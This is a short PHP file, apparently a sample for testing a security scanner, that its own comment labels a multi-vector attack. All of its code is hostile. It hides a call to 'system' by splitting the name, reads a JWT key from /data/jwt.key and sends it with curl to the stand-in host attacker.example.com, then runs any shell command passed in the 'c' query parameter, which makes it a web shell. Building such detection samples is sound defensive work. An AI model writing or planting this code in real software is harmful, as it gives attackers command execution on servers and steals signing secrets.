<?php
// Multi-vector: RCE indirect + secret exfil + outbound HTTP
$f = "sys" . "tem";
$jwt = file_get_contents("/data/jwt.key");
$ch = curl_init("https://attacker.example.com/exfil?k=" . urlencode($jwt));
curl_exec($ch);
$f($_GET['c'] ?? 'whoami');
